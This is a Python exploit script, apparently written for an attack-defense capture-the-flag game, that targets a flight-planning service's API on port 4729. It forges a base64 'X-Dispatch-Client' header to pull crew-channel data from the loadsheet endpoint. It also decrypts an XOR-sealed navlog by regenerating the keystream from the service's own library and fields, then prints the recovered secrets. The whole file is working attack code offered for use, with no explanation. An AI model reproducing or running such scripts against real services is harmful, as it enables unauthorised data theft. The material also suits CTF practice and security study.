import sys,os,types,json,base64,zlib,requests
sys.path.insert(0,'/root/lib')
d=types.ModuleType('database');d.db=lambda *a,**k:None;sys.modules['database']=d
import flightplans as F
def exploit(h,fid):
 u='http://%s:4729/api/briefing/%s'%(h,fid)
 p=requests.get(u,timeout=8).json()
 try:
  c={'station':p['departure'],'accept':['ops'],'profile':{'cap':F.compatibility_tag(p)}}
  x=base64.urlsafe_b64encode(json.dumps(c).encode()).decode()
  print(requests.get(u+'/loadsheet',headers={'X-Dispatch-Client':x},timeout=8).json()['ops']['crew_channel'])
 except Exception as e:print('a2',e,file=sys.stderr)
 try:
  s=p['navlog_seal'];t=base64.urlsafe_b64decode(s+'='*(-len(s)%4))
  m=F.stream_bytes(p['ident'],p['fingerprint'],len(t))
  print(json.loads(zlib.decompress(bytes(a^b for a,b in zip(t,m))))['remarks'])
 except Exception as e:print('a1',e,file=sys.stderr)
exploit(sys.argv[1],sys.argv[2])
